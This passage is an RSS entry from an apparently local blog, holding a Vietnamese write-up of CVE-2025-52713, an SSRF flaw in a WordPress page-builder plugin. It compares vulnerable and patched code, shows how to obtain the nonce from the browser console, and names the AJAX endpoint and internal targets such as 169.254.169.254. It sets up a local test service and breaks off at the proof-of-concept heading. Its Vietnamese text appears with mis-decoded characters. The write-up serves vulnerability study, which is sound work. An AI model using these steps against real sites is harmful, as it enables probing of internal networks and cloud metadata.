      <guid>http://localhost:1313/vi/posts/2025-11-01-cve-2025-52713/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-01-cve-2025-52713/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; trong plugin &lt;strong&gt;BoldGrid Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng th·ª±c hi·ªán &lt;strong&gt;y√™u c·∫ßu gi·∫£ m·∫°o t·ª´ ph√≠a m√°y ch·ªß&lt;/strong&gt;.&#xA;V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn plugin &lt;strong&gt;Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor&lt;/strong&gt; t·ª´ phi√™n b·∫£n &lt;strong&gt;ch∆∞a x√°c ƒë·ªãnh cho ƒë·∫øn 1.27.8&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-52713&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-52713&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.27.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.27.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/post-and-page-builder/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor&lt;/strong&gt;: &lt;strong&gt;1.27.8&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;1.27.9&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function get_redirect_url() {&#xA;    $urls = ! empty( $_POST[&amp;#39;urls&amp;#39;] ) ? $_POST[&amp;#39;urls&amp;#39;] : null;&#xA;&#xA;    self::validate_nonce( &amp;#39;image&amp;#39; );&#xA;    $unsplash_404 = &amp;#39;https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop&amp;amp;fm=jpg&amp;amp;h=800&amp;amp;q=50&amp;amp;w=1200&amp;#39;;&#xA;&#xA;    $redirectUrls = array();&#xA;    foreach( $urls as $url ) {&#xA;        $response = wp_remote_head( $url );&#xA;        $headers = is_array( $response ) &amp;amp;&amp;amp; ! empty( $response[&amp;#39;headers&amp;#39;] ) ? $response[&amp;#39;headers&amp;#39;]-&amp;gt;getAll() : array();&#xA;        $redirectUrl = ! empty( $headers[&amp;#39;location&amp;#39;] ) ? $headers[&amp;#39;location&amp;#39;] : false;&#xA;        $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false;&#xA;        $redirectUrls[ $url ] = $redirectUrl;&#xA;    }&#xA;&#xA;    if ( ! empty( $redirectUrls ) ) {&#xA;        wp_send_json_success( $redirectUrls );&#xA;    } else {&#xA;        status_header( 400 );&#xA;        wp_send_json_error();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong &lt;strong&gt;phi√™n b·∫£n l·ªói&lt;/strong&gt;, h√†m &lt;code&gt;get_redirect_url()&lt;/code&gt; nh·∫≠n m·∫£ng URL t·ª´ &lt;code&gt;$_POST[&#39;urls&#39;]&lt;/code&gt;, sau ƒë√≥ duy·ªát qua t·ª´ng ph·∫ßn t·ª≠ v√† g·ª≠i request b·∫±ng &lt;code&gt;wp_remote_head($url)&lt;/code&gt; m√† &lt;strong&gt;kh√¥ng h·ªÅ ki·ªÉm tra ho·∫∑c l·ªçc d·ªØ li·ªáu ƒë·∫ßu v√†o&lt;/strong&gt;. Vi·ªác n√†y cho ph√©p k·∫ª t·∫•n c√¥ng t·ª± cung c·∫•p URL t√πy √Ω ƒë·ªÉ m√°y ch·ªß g·ª≠i y√™u c·∫ßu t·ªõi c√°c ƒë·ªãa ch·ªâ n·ªôi b·ªô nh∆∞ &lt;code&gt;127.0.0.1&lt;/code&gt; ho·∫∑c &lt;code&gt;169.254.169.254&lt;/code&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;l·ªó h·ªïng SSRF&lt;/strong&gt;. Ngo√†i ra, do kh√¥ng gi·ªõi h·∫°n &lt;code&gt;timeout&lt;/code&gt; hay s·ªë l·∫ßn &lt;code&gt;redirection&lt;/code&gt;, h√†m c√≤n c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ g√¢y &lt;strong&gt;treo ho·∫∑c t·∫•n c√¥ng t·ª´ ch·ªëi d·ªãch v·ª• (DoS)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_redirect_url() {&#xA;    $urls = ! empty( $_POST[&amp;#39;urls&amp;#39;] ) ? $_POST[&amp;#39;urls&amp;#39;] : null;&#xA;&#xA;    self::validate_nonce( &amp;#39;image&amp;#39; );&#xA;    $unsplash_404 = &amp;#39;https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop&amp;amp;fm=jpg&amp;amp;h=800&amp;amp;q=50&amp;amp;w=1200&amp;#39;;&#xA;    $redirectUrls = array();&#xA;    foreach( $urls as $url ) {&#xA;        $response = wp_safe_remote_head( esc_url_raw( $url ), array(&#xA;            &amp;#39;timeout&amp;#39;     =&amp;gt; 5,&#xA;            &amp;#39;redirection&amp;#39; =&amp;gt; 5,&#xA;        ) );&#xA;        $headers = is_array( $response ) &amp;amp;&amp;amp; ! empty( $response[&amp;#39;headers&amp;#39;] ) ? $response[&amp;#39;headers&amp;#39;]-&amp;gt;getAll() : array();&#xA;        $redirectUrl = ! empty( $headers[&amp;#39;location&amp;#39;] ) ? $headers[&amp;#39;location&amp;#39;] : false;&#xA;        $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false;&#xA;        $redirectUrls[ $url ] = $redirectUrl;&#xA;    }&#xA;&#xA;    if ( ! empty( $redirectUrls ) ) {&#xA;        wp_send_json_success( $redirectUrls );&#xA;    } else {&#xA;        status_header( 400 );&#xA;        wp_send_json_error();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ thay &lt;code&gt;wp_remote_head()&lt;/code&gt; b·∫±ng &lt;code&gt;wp_safe_remote_head()&lt;/code&gt; k·∫øt h·ª£p v·ªõi &lt;code&gt;esc_url_raw()&lt;/code&gt; ƒë·ªÉ l·ªçc v√† ch·ªâ cho ph√©p URL h·ª£p l·ªá, ƒë·ªìng th·ªùi b·ªï sung c√°c tham s·ªë b·∫£o v·ªá nh∆∞ &lt;code&gt;timeout =&amp;gt; 5&lt;/code&gt; v√† &lt;code&gt;redirection =&amp;gt; 5&lt;/code&gt;. Nh·ªù ƒë√≥, h√†m ch·ªâ g·ª≠i request ƒë·∫øn c√°c host an to√†n, ngƒÉn SSRF v√† h·∫°n ch·∫ø c√°c r·ªßi ro v·ªÅ hi·ªáu nƒÉng.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;H√†m &lt;code&gt;self::validate_nonce( &#39;image&#39; );&lt;/code&gt; trong ƒëo·∫°n m√£ ƒë∆∞·ª£c g·ªçi ƒë·ªÉ &lt;strong&gt;x√°c th·ª±c nonce&lt;/strong&gt; ‚Äî m·ªôt c∆° ch·∫ø b·∫£o v·ªá c·ªßa WordPress nh·∫±m ngƒÉn &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function validate_nonce( $name ) {&#xA;    $nonce = ! empty( $_POST[ self::$nonces[ $name ] ] ) ?&#xA;        $_POST[ self::$nonces[ $name ] ] : null;&#xA;&#xA;    $valid = wp_verify_nonce( $nonce, self::$nonces[ $name ] );&#xA;&#xA;    if ( ! $valid ) {&#xA;        status_header( 401 );&#xA;        wp_send_json_error();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C·ª• th·ªÉ, plugin ƒë·ªãnh nghƒ©a m·ªôt m·∫£ng tƒ©nh &lt;code&gt;$nonces&lt;/code&gt; ch·ª©a c√°c t√™n nonce t∆∞∆°ng ·ª©ng v·ªõi t·ª´ng h√†nh ƒë·ªông:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected static $nonces = array(&#xA;    &amp;#39;image&amp;#39; =&amp;gt; &amp;#39;boldgrid_gridblock_image_ajax_nonce&amp;#39;,&#xA;    &amp;#39;setup&amp;#39; =&amp;gt; &amp;#39;boldgrid_editor_setup&amp;#39;,&#xA;    &amp;#39;gridblock_save&amp;#39; =&amp;gt; &amp;#39;boldgrid_editor_gridblock_save&amp;#39;,&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi h√†m &lt;code&gt;validate_nonce(&#39;image&#39;)&lt;/code&gt; ƒë∆∞·ª£c g·ªçi, n√≥ s·∫Ω:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;L·∫•y gi√° tr·ªã nonce t·ª´ request POST theo key &lt;code&gt;boldgrid_gridblock_image_ajax_nonce&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra gi√° tr·ªã n√†y b·∫±ng &lt;code&gt;wp_verify_nonce()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu nonce kh√¥ng h·ª£p l·ªá (nghƒ©a l√† request kh√¥ng ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ trang WordPress h·ª£p ph√°p), h√†m s·∫Ω tr·∫£ v·ªÅ &lt;strong&gt;HTTP 401 Unauthorized&lt;/strong&gt; v√† d·ª´ng x·ª≠ l√Ω th√¥ng qua &lt;code&gt;wp_send_json_error()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition tip open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-lightbulb&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;M·∫πo&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Khi t√¨m ki·∫øm t·ª´ kh√≥a &lt;code&gt;boldgrid_gridblock_image_ajax_nonce&lt;/code&gt; trong m√£ ngu·ªìn plugin, ta th·∫•y gi√° tr·ªã n√†y ƒë∆∞·ª£c g√°n t·ª´ bi·∫øn JavaScript &lt;code&gt;BoldgridEditor.grid_block_nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-01-cve-2025-52713/nonce.png&#34; title=&#34;Gi√° tr·ªã c·ªßa nonce trong JS&#34; data-thumbnail=&#34;/posts/2025-11-01-cve-2025-52713/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa nonce trong JS&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-01-cve-2025-52713/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;549&#34; width=&#34;1539&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã c·ªßa nonce trong JS&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Do ƒë√¢y l√† y√™u c·∫ßu AJAX ƒë∆∞·ª£c g·ª≠i t·ª´ ph√≠a client, n√™n ƒë·ªÉ l·∫•y nonce hi·ªán t·∫°i, ta c√≥ th·ªÉ m·ªü &lt;strong&gt;Console&lt;/strong&gt; tr√™n tr√¨nh duy·ªát v√† g·ªçi:&#xA;&lt;code&gt;BoldgridEditor.grid_block_nonce&lt;/code&gt; khi t·∫°o post b·∫±ng plugin n√†y.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-01-cve-2025-52713/nonce_value.png&#34; title=&#34;Gi√° tr·ªã c·ªßa nonce trong console&#34; data-thumbnail=&#34;/posts/2025-11-01-cve-2025-52713/nonce_value.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce value&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa nonce trong console&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-01-cve-2025-52713/nonce_value.png&#39; alt=&#34;Nonce value&#34; height=&#34;416&#34; width=&#34;1052&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã c·ªßa nonce trong console&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;&lt;code&gt;get_redirect_url()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_boldgrid_redirect_url&amp;#39;, array( $boldgrid_editor_ajax, &amp;#39;get_redirect_url&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†: Khi client g·ª≠i request AJAX ƒë·∫øn endpoint &lt;code&gt;/wp-admin/admin-ajax.php?action=boldgrid_redirect_url&lt;/code&gt; th√¨ &lt;code&gt;get_redirect_url()&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url &amp;#43; $_POST[&amp;#39;urls&amp;#39;]&amp;#34;] --&amp;gt; B[&amp;#34;wp_ajax_boldgrid_redirect_url ‚Üí get_redirect_url()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;self::validate_nonce(&amp;#39;image&amp;#39;)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;read $_POST[&amp;#39;urls&amp;#39;]&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;foreach $url&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;wp_remote_head($url)  ‚Üê SSRF sink&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;extract headers[&amp;#39;location&amp;#39;] ‚Üí $redirectUrls&amp;#34;]&#xA;G --&amp;gt; H{&amp;#34;$redirectUrls not empty?&amp;#34;}&#xA;H -- Yes --&amp;gt; I[&amp;#34;wp_send_json_success($redirectUrls)&amp;#34;]&#xA;H -- No --&amp;gt; J[&amp;#34;wp_send_json_error()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;content&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 